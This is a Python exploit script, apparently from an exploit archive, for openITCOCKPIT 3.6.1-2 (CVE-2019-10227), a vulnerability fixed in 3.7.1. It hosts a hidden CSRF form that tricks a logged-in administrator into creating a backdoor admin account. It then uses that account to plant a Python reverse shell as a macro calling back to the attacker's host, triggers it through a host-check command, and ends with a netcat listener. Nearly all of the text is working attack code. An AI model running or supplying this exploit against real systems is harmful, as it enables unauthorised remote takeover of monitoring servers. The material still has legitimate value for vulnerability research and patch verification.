# Google Dork: N/A
# Exploit Author: Julian Rittweger
# Vendor Homepage: https://openitcockpit.io/
# Software Link: https://github.com/it-novum/openITCOCKPIT/releases/tag/openITCOCKPIT-3.6.1-2
# Fixed in: 3.7.1 | https://github.com/it-novum/openITCOCKPIT/releases
# Version: 3.6.1-2
# Tested on: Debian 9
# CVE : 2019-10227
# Exploit Requirements: pip3 install bs4 requests && apt install netcat

#!/usr/bin/env python
import requests, urllib3, os
import http.server, socketserver

from bs4 import BeautifulSoup as bs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print("""
--                                                                                        
  openITCOCKPIT v.3.6.1-2
  [CSRF 2 RCE]
--
""")

# Setup values
RHOST = input(&#039;[x] Enter IP of remote machine: &#039;)
LHOST = input(&#039;[x] Enter IP of local  machine: &#039;)
RPORT = int(input(&#039;[x] Enter local port (back-connection): &#039;))
LPORT = int(input(&#039;[x] Enter local port (payload-hosting): &#039;))

print(&#039;[-] Generating CSRF form using the following credentials: "hacked@oicp.app - letmein1337" ..&#039;)

# Generate file which serves CSRF payload
pl = open(&#039;./index.html&#039;, &#039;w&#039;)
# Register HTTP server
handler = http.server.SimpleHTTPRequestHandler

csrf = """
<iframe style="display:none;" name="csrff"></iframe>
<form method="post" action="https://""" + RHOST + """/users/add" target="csrff" style="display:none;">
	<input type="text" name="_method" value="POST">
	<input type="text" name="data[User][Container][]" value="1">
	<input type="text" name="data[ContainerUserMembership][1]" value="2">
	<input type="text" name="data[User][usergroup_id]" value="1">
	<input type="text" name="data[User][status]" value="1">
	<input type="text" name="data[User][email]" value="hacked@oicp.app">
	<input type="text" name="data[User][firstname]" value="Mr">
	<input type="text" name="data[User][lastname]" value="Nice">
	<input type="text" name="data[User][new_password]" value="letmein1337">
	<input type="text" name="data[User][confirm_new_password]" value="letmein1337">
	<input type="submit">
</form>
<script>
	function Redirect() {  
        window.location="https://""" + RHOST + """/login/logout"; 
    } 

	document.forms[0].submit();
    setTimeout(&#039;Redirect()&#039;, 3000);   
</script>
"""

pl.write(csrf)
pl.close()
httpd = socketserver.TCPServer(("", LPORT), handler)

# Start HTTP server, quit on keyboard interrupt
try:
	print(&#039;[!] Send this URL to a logged-in administrator: http://&#039; + LHOST + &#039;:&#039; + str(LPORT))
	httpd.serve_forever()
except KeyboardInterrupt:
	httpd.socket.close()
	print(&#039;\n[-] Starting exploitation ..&#039;)

print(&#039;[-] Logging in ..&#039;)
# Proceed login with generated credentials
c = requests.post(&#039;https://&#039; + RHOST + &#039;/login/login&#039;, data={&#039;_method&#039; : &#039;POST&#039;, &#039;data[LoginUser][username]&#039; : &#039;hacked@oicp.app&#039;, &#039;data[LoginUser][password]&#039; : &#039;letmein1337&#039;}, verify=False, allow_redirects=False).headers[&#039;Set-Cookie&#039;]
print(&#039;[!] Received cookie: &#039; + c.split(&#039;;&#039;)[0])
print(&#039;[-] Creating reverse-shell as macro ..&#039;)
# Insert a new macro identified as $USER99$ 
makro = {&#039;_method&#039; : &#039;POST&#039;, &#039;data[0][Macro][id]&#039; : 1, &#039;data[0][Macro][name]&#039; : &#039;$USER1$&#039;, &#039;data[0][Macro][value]&#039; : &#039;/opt/openitc/nagios/libexec&#039;, &#039;data[0][Macro][description]&#039; : &#039;default&#039;, &#039;data[0][Macro][password]&#039; : 0, &#039;data[1][Macro][id]&#039; : 2, &#039;data[1][Macro][name]&#039; : &#039;$USER99$&#039;, &#039;data[1][Macro][value]&#039; : "python -c &#039;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + LHOST + "\"," + str(RPORT) + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);&#039;", &#039;data[1][Macro][password]&#039; : 1}
requests.post(&#039;https://&#039; + RHOST + &#039;/macros&#039;, data=makro, verify=False, cookies={&#039;itnovum&#039; : c.split(&#039;;&#039;)[0].split(&#039;=&#039;)[1]})
print(&#039;[-] Inserting macro as command ..&#039;)
# Register a new command using the inserted macro
requests.post(&#039;https://&#039; + RHOST + &#039;/commands/add/_controller:commands/_action:hostchecks&#039;, data={&#039;_method&#039; : &#039;POST&#039;, &#039;data[Command][command_type]&#039; : 2, &#039;data[Command][name]&#039; : &#039;pwned&#039;, &#039;data[Command][command_line]&#039; : &#039;$USER99$&#039;}, verify=False, cookies={&#039;itnovum&#039; : c.split(&#039;;&#039;)[0].split(&#039;=&#039;)[1]})
h = bs(requests.get(&#039;https://&#039; + RHOST + &#039;/commands/hostchecks&#039;, verify=False, cookies={&#039;itnovum&#039; : c.split(&#039;;&#039;)[0].split(&#039;=&#039;)[1]}).text, &#039;html.parser&#039;)
ids = []

# Fetch current commands by ID
for i in h.find_all(&#039;form&#039;, {&#039;action&#039;: lambda x : x.startswith(&#039;/commands/delete&#039;)}):
	ids.append(i.get(&#039;action&#039;).split(&#039;/&#039;)[-1])

print(&#039;[!] ID of command identified as: &#039; + str(ids[-1]))
print(&#039;[-] Updating default host ..&#039;)

# Update host, using the new malicious "hostcheck" command
sett = {&#039;_method&#039;:&#039;POST&#039;,&#039;data[Host][id]&#039;:&#039;1&#039;,&#039;data[Host][container_id]&#039;:&#039;1&#039;,&#039;data[Host][shared_container]&#039;:&#039;&#039;,&#039;data[Host][hosttemplate_id]&#039;:&#039;1&#039;,&#039;data[Host][name]&#039;:&#039;localhost&#039;,&#039;data[Host][description]&#039;:&#039;default+host&#039;,&#039;data[Host][address]&#039;:&#039;127.0.0.1&#039;,&#039;data[Host][Hostgroup]&#039;:&#039;&#039;,&#039;data[Host][Parenthost]&#039;:&#039;&#039;,&#039;data[Host][notes]&#039;:&#039;&#039;,&#039;data[Host][host_url]&#039;:&#039;&#039;,&#039;data[Host][priority]&#039;:&#039;1&#039;,&#039;data[Host][tags]&#039;:&#039;&#039;,&#039;data[Host][notify_period_id]&#039;:&#039;1&#039;,&#039;data[Host][notification_interval]&#039;:&#039;0&#039;,&#039;data[Host][notification_interval]&#039;:&#039;0&#039;,&#039;data[Host][notify_on_recovery]&#039;:&#039;0&#039;,&#039;data[Host][notify_on_recovery]&#039;:&#039;1&#039;,&#039;data[Host][notify_on_down]&#039;:&#039;0&#039;,&#039;data[Host][notify_on_unreachable]&#039;:&#039;0&#039;,&#039;data[Host][notify_on_unreachable]&#039;:&#039;1&#039;,&#039;data[Host][notify_on_flapping]&#039;:&#039;0&#039;,&#039;data[Host][notify_on_downtime]&#039;:&#039;0&#039;,&#039;data[Host][active_checks_enabled]&#039;:&#039;0&#039;,&#039;data[Host][active_checks_enabled]&#039;:&#039;1&#039;,&#039;data[Host][Contact]&#039;:&#039;&#039;,&#039;data[Host][Contact][]&#039;:&#039;1&#039;,&#039;data[Host][Contactgroup]&#039;:&#039;&#039;,&#039;data[Host][command_id]&#039;:ids[-1],&#039;data[Host][check_period_id]&#039;:&#039;1&#039;,&#039;data[Host][max_check_attempts]&#039;:&#039;3&#039;,&#039;data[Host][check_interval]&#039;:&#039;120&#039;,&#039;data[Host][check_interval]&#039;:&#039;120&#039;,&#039;data[Host][retry_interval]&#039;:&#039;120&#039;,&#039;data[Host][retry_interval]&#039;:&#039;120&#039;,&#039;data[Host][flap_detection_enabled]&#039;:&#039;0&#039;,&#039;data[Host][flap_detection_on_up]&#039;:&#039;0&#039;,&#039;data[Host][flap_detection_on_down]&#039;:&#039;0&#039;, &#039;data[Host][flap_detection_on_unreachable]&#039; : 0}
requests.post(&#039;https://&#039; + RHOST + &#039;/hosts/edit/1/_controller:hosts/_action:browser/_id:1/&#039;, data=sett, verify=False, cookies={&#039;itnovum&#039; : c.split(&#039;;&#039;)[0].split(&#039;=&#039;)[1]})

# Refresh host configuration
print(&#039;[-] Refreshing host configuration ..&#039;)
requests.get(&#039;https://&#039; + RHOST + &#039;/exports/launchExport/0.json&#039;, verify=False, cookies={&#039;itnovum&#039; : c.split(&#039;;&#039;)[0].split(&#039;=&#039;)[1]}, headers={&#039;X-Requested-With&#039; : &#039;XMLHttpRequest&#039;})

print(&#039;[!] Done! Enjoy your shell (popup in approx. 30s): &#039;)

# We did it!
os.system(&#039;nc -lvp &#039; + str(RPORT))

